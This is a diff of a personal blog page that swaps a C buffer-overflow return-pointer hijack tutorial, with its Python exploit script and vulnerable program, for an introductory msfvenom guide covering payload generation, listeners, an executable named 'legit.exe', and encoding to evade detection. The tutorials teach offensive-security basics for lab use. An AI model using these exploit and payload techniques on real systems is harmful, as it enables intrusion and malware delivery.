@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="C buffer overflow to hijack RP, coding, hacking, software">
-    <meta name="description" content="Buffer overflow to overwrite the Return Pointer and execute any function.">
+    <meta name="keywords" content="Easy msfvenom, coding, hacking, software">
+    <meta name="description" content="An easy introduction to generating payloads with msfvenom.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C buffer overflow to hijack RP | myCodingJournal</title>
+    <title>Easy msfvenom | myCodingJournal</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -203,7 +203,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">C buffer overflow to hijack RP</h1>
+                    <h1 class="description center-align post-title">Easy msfvenom</h1>
                 </div>
             </div>
         </div>
@@ -320,12 +320,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="../../../../tags/binary-exploitation/">
-                                <span class="chip bg-color">binary exploitation</span>
-                            </a>
-                        
-                            <a href="../../../../tags/C/">
-                                <span class="chip bg-color">C</span>
+                            <a href="../../../../tags/metasploit/">
+                                <span class="chip bg-color">metasploit</span>
                             </a>
                         
                     </div>
@@ -349,21 +345,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-05-13
+                    2020-05-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-05-13
+                    2020-05-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    427
+                    433
                 </div>
                 
 
@@ -381,51 +377,35 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>The return pointer (RP) is located at the bottom of the function stack. If we can overflow the buffer we can write any address to the RP and hijack it to execute a hidden function, like <code>validate()</code>. We will use <code>gdb</code>.</p>
-<h3 id="Code-execution-via-buffer-overflow-mitigations"><a href="#Code-execution-via-buffer-overflow-mitigations" class="headerlink" title="Code execution via buffer overflow: mitigations"></a>Code execution via buffer overflow: mitigations</h3><p>The exploit here is to insert more bytes than the buffer size, such that the additional bytes reach the bottom of the stack. Note that measures to protect from buffer overflow include ASLR (Address Space Layout Randomization), stack canaries and the NX (No Execute) section. But it is still possible to break the code! (Check <a href="https://github.com/slimm609/checksec.sh.git" target="_blank" rel="noopener"><code>checksec</code></a>))</p>
-<p>If there is a canary before the return pointer, the modified canary will alert and end the program: <code>stack smashing detected</code>.<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/protected.png" alt="Stack smashing detected"></p>
-<p>For demonstration purposes, I am going to disable ASLR and stack canaries.</p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># disable ASLR</span>
-$ <span class="token function">sudo</span> <span class="token function">bash</span> -c <span class="token string">'echo 0 > /proc/sys/kernel/randomize_va_space'</span>
-<span class="token comment" spellcheck="true"># disable stack canaries</span>
-$ gcc -fno-stack-protector -o hijackRP hijackRP.c
-$ gdb ./hijackRP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h2><p>If we examine with gdb, we find a hidden function that never gets triggered…</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ pwngdb<span class="token operator">></span> info func<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/info_func.png" alt="Results of `info func`"></p>
-<p>First, which character position of user input will the RP be overwritten? We first insert A LOT of characters to provoque segmentation fault. By knowing roughly the size of the buffer, we’ll use a python script <a href="https://github.com/Svenito/exploit-pattern" target="_blank" rel="noopener"><code>pattern.py</code></a> to know exactly which character overwrites RP. We identified that the buffer overflows in 50 character as upper bound.<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/segment_fault_test.png" alt="Segmentation fault with 50 characters"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/create_pattern.png" alt="Use pattern.py to create a testing user input"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/segment_fault_rp.png" alt="gdb shows the data at RP when segmentation fault"><br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/pattern_rp_position.png" alt="pattern.py shows at which position this pattern is"></p>
-<p>Now that we know the exact position of the RP, we’ll finish with a python script.</p>
-<pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">nano</span> buffer_hijack_rp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-python"><code class="language-python">offset <span class="token operator">=</span> <span class="token number">40</span>   <span class="token comment" spellcheck="true"># the output of pattern.py</span>
-rp <span class="token operator">=</span> <span class="token string">"\xe4\x06\x00\x08\x00\x00\x00\x00"</span>  <span class="token comment" spellcheck="true"># little endian 64-bit, the value that we want the RP to be</span>
-exploit <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
-exploit <span class="token operator">+=</span> rp
-exploit <span class="token operator">+=</span> <span class="token string">'H'</span> <span class="token operator">*</span> <span class="token number">10</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>exploit<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Then:<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/found_hidden_func.png" alt="Execute overflow()"></p>
-<hr>
-<h3 id="Vulnerable-code"><a href="#Vulnerable-code" class="headerlink" title="Vulnerable code"></a>Vulnerable code</h3><p>If you are curious, the vulnerable code is:</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What is the secret word?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is dangerous, better scanf("%19s", data)</span>
-
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">void</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"YaY! Flag is: guiltycrown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<hr>
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The lesson here for blue team is DON’T TRUST USER INPUT. It could lead to buffer overflows, code injection and remote code execution, not only for C: for Python, use <code>raw_input()</code> instead of <code>input()</code>; in PHP, avoid calling <code>eval()</code> directly on user input. In a nutshell, users should not be able to trigger code.</p>
-<hr>
-<p>Small note:</p>
-<p>…</p>
-<p>Really, this flag is easily found using <code>strings</code> command…<br>But it is worth it to learn how to execute arbitrary functions, as for example functions to bypass license verification. :)</p>
+                <h2 id="List-payloads"><a href="#List-payloads" class="headerlink" title="List payloads"></a>List payloads</h2><p>Get a list of payloads with:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -l payloads<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Get more information and how to configure the payloads with:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> --list-options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Staged-and-stageless-payloads"><a href="#Staged-and-stageless-payloads" class="headerlink" title="Staged and stageless payloads"></a>Staged and stageless payloads</h3><p>Staged payloads have a “/“ in between their name, while stageless payloads not. For example, “windows/shell_bind_tcp” is stageless and “windows/shell/bind_tcp” is staged. Staged payloads are smaller in size because it tells the victim to download the rest of the payload. This is useful when the input size is limited.</p>
+<p>Staged payloads need special payload listeners, like Metasploit’s Meterpreter multi/handler:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msf<span class="token operator">></span> use exploit/multi/handler
+$ exploit/multi/handler<span class="token operator">></span> <span class="token keyword">set</span> payload <span class="token operator">&lt;</span>payload<span class="token operator">></span>
+$ <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Stafeless payloads like “shell_bind_tcp” can be exploited with <code>nc</code>.</p>
+<h2 id="Configuring-the-payload"><a href="#Configuring-the-payload" class="headerlink" title="Configuring the payload"></a>Configuring the payload</h2><p>Configurations are listed when <code>--list-options</code> is called.</p>
+<p>Common words are <strong>LHOST</strong> (listening host), <strong>LPORT</strong> (listening port) and <strong>EXITFUNC</strong> (method to execute when exit). The EXITFUNC can have values:</p>
+<ul>
+<li>none</li>
+<li>seh : restart the process or thread automatically when an error occurs</li>
+<li>thread : the exploited process runs the shellcode in a sub-thread, so exiting the thread won’t cause disruption (clean exit)</li>
+<li>process : exit the process</li>
+</ul>
+<p>The syntax is:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> LHOST<span class="token operator">=</span>192.168.0.90 LPORT<span class="token operator">=</span>4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Output-format"><a href="#Output-format" class="headerlink" title="Output format"></a>Output format</h3><p>You can choose which format to output. To see a list of formats:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> -l formats<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>For example, for EXE format, we can redirect it to an specified EXE file:</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> -f exe -o legit.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Further-refinating"><a href="#Further-refinating" class="headerlink" title="Further refinating"></a>Further refinating</h2><h3 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h3><p>Encoding will obfuscate the shellcode and make it less detectable. It can be encoded various iterations. It works like this: the shellcode is encoded but the decoding way and the number of iterations is also in the payload. Set the encoder with <code>-e</code> and the number of iterations with <code>-i</code>.</p>
+<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> <span class="token operator">&lt;</span>config<span class="token operator">></span> -e x86/shikata_ga_nai -i 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="Bad-characters"><a href="#Bad-characters" class="headerlink" title="Bad characters"></a>Bad characters</h3><p>There are characters that must be avoided, like ‘\x00’ (null byte), ‘\x0a’ (line feed) or ‘\x0d’ (carriage return), because these will crash the program in a buffer overflow. Avoid then using <code>-b \x00\x0a\x0d</code>. Then the shellcode is handled by an encoder that avoids this byte.</p>
+<h3 id="NOP-sled"><a href="#NOP-sled" class="headerlink" title="NOP sled"></a>NOP sled</h3><p>NOP sled is useful because the memory addresses inside gdb is a bit moved, so we don’t know exactly where to place the return pointer. If the return pointer landed in between NOPs, it will continue doing nothing until finding the shellcode. Use msfvenom to preppend 100 bytes of NOPs in a fancy way (encoded) with <code>-n 100</code>. We can also include bare NOPs with b’\x90’.</p>
+<h3 id="Python-variable-name"><a href="#Python-variable-name" class="headerlink" title="Python variable name"></a>Python variable name</h3><p>Use <code>-v &lt;name&gt;</code> to set the variable name in python code.</p>
 
             </div>
             <hr/>
@@ -489,12 +469,8 @@ exploit <span class="token operator">+=</span> <span class="token string">'H'</s
                     
                         <div class="article-tag">
                             
-                                <a href="../../../../tags/binary-exploitation/">
-                                    <span class="chip bg-color">binary exploitation</span>
-                                </a>
-                            
-                                <a href="../../../../tags/C/">
-                                    <span class="chip bg-color">C</span>
+                                <a href="../../../../tags/metasploit/">
+                                    <span class="chip bg-color">metasploit</span>
                                 </a>
                             
                         </div>
@@ -535,11 +511,61 @@ exploit <span class="token operator">+=</span> <span class="token string">'H'</s
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="../c-buffer-overflow-to-inject-shellcode/">
+                <a href="">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Easy msfvenom">
+                        
+                        <span class="card-title">Easy msfvenom</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            An easy introduction to generating payloads with msfvenom.
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/Hacking/" class="post-category">
+                                    Hacking
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="../../../../tags/metasploit/">
+                        <span class="chip bg-color">metasploit</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../../14/c-buffer-overflow-to-inject-shellcode/">
                     <div class="card-image">
                         
                         <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="C buffer overflow to inject shellcode">
@@ -554,9 +580,9 @@ exploit <span class="token operator">+=</span> <span class="token string">'H'</s
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -578,58 +604,6 @@ exploit <span class="token operator">+=</span> <span class="token string">'H'</s
                     
                     <a href="../../../../tags/C/">
                         <span class="chip bg-color">C</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="../python-threads-1/">
-                    <div class="card-image">
-                        
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Python threads 1">
-                        
-                        <span class="card-title">Python threads 1</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Simple python server socket using multithreading
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="../../../../categories/Programming/" class="post-category">
-                                    Programming
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="../../../../tags/concurrency/">
-                        <span class="chip bg-color">concurrency</span>
-                    </a>
-                    
-                    <a href="../../../../tags/python/">
-                        <span class="chip bg-color">python</span>
                     </a>
                     
                 </div>
